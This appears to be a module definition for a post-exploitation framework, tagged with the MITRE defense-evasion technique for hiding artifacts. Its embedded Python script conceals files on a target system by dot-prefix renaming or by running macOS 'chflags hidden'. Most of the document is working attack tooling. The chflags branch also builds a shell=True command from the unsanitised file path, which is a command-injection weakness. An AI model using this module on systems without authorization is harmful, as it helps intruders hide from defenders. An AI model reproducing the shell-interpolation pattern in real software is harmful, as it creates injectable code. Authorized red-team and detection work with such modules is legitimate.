name: hide_artifacts
authors:
  - name: Anthony Rose
    handle: '@Cx01N'
    link: https://twitter.com/Cx01N_
description: |
  Hides files and directories on a Linux target by renaming them
  with a dot prefix, which is the standard convention for hidden
  files on Unix systems. On macOS, also supports using the chflags
  hidden command.
software: ''
tactics: [TA0005]
techniques: [T1564.001]
background: false
output_extension: ''
needs_admin: false
opsec_safe: false
language: python
min_language_version: '2.6'
comments:
  - https://github.com/redcanaryco/atomic-red-team
options:
  - name: FilePath
    description: Path to the file or directory to hide.
    required: true
    value: ''
  - name: Method
    description: >-
      Method to hide (dotprefix or chflags). chflags only works on macOS.
    required: true
    value: 'dotprefix'
    suggested_values:
      - dotprefix
      - chflags
script: |
  import os
  import platform
  import subprocess

  file_path = '{{ FilePath }}'.strip()
  method = '{{ Method }}'.strip().lower() or 'dotprefix'
  results = []

  if not file_path:
      print('[-] FilePath is required.')
  elif not os.path.exists(file_path):
      print('[-] File not found: {}'.format(file_path))
  else:
      if method == 'dotprefix':
          dirname = os.path.dirname(file_path)
          basename = os.path.basename(file_path)
          if not basename.startswith('.'):
              new_path = os.path.join(dirname, '.' + basename)
              try:
                  os.rename(file_path, new_path)
                  results.append('[+] Renamed {} to {}'.format(file_path, new_path))
              except Exception as e:
                  results.append('[-] Failed to rename {}: {}'.format(file_path, str(e)))
          else:
              results.append('[*] File already has dot prefix: {}'.format(file_path))
      elif method == 'chflags':
          try:
              proc = subprocess.Popen('chflags hidden "{}"'.format(file_path), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
              output, stderr = proc.communicate()
              stderr = stderr.decode('utf-8', errors='replace')
              if proc.returncode != 0:
                  results.append('[-] chflags failed: {}'.format(stderr.strip()))
              else:
                  results.append('[+] Set hidden flag on: {}'.format(file_path))
          except Exception as e:
              results.append('[-] chflags failed (macOS only): {}'.format(str(e)))
      else:
          results.append('[-] Invalid method: {}. Use dotprefix or chflags.'.format(method))

      print('\n'.join(results))
